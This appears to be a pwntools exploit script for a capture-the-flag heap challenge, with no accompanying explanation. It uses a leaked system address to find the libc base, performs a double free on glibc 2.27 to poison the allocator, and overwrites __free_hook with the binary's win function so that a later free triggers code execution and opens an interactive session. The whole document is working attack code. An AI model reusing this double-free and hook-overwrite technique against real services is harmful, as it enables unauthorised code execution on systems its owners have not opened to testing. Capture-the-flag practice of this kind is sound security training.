#!/usr/bin/env python3

from pwn import *

pty = process.PTY
exe = ELF("./chal")
libc = ELF("./libc.so.6",checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)
rop = ROP(exe)

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path], env={"LD_PRELOAD":libc.path}, stdin=pty, stdout=pty)
    else:
        return remote("addr", 1337)
        
def malloc(r, stuff):
    r.sendline("1")
    r.sendline(stuff)
    r.recvuntil("Enter 1 to buy food, 2 to return tray: ").decode()
    

def free(r, index):
    r.sendline("2")
    r.sendline(str(index))
    r.recvuntil("Enter 1 to buy food, 2 to return tray: ").decode()

def main():
    r = conn()
    r.recvline()
    line = r.recvline()
    system_addr = int(line)
    print(system_addr)
    print("system: ", hex(system_addr))
    print("libc offset: ", hex(system_addr - libc.sym.system))
    libc.address = system_addr - libc.sym.system
    
    print("malloc hook:", hex(libc.sym.__free_hook))
    
    # Malloc 1, malloc 2, free 1, free 2, free 1
    malloc(r, "garbage")
    malloc(r, "garbage")
    print("Malloc")
    free(r, 0)
    print("free 1")
    free(r, 1)
    print("free 2")
    free(r, 0)
    print("free 1")
    
    
    # now when we malloc we get back chunk 1
    malloc(r, p64(libc.sym.__free_hook))
    
    print("malloc 2")
    
    malloc(r,b"\0"*10)
    malloc(r, b"\0"*10)
    
    
    pl = p64(exe.sym.win)
    
    malloc(r, pl)
    print("malloc 3")
    
    # call malloc to execute rce
    free(r, 1)
    print("malloc 4")

    r.interactive()


if __name__ == "__main__":
    main()
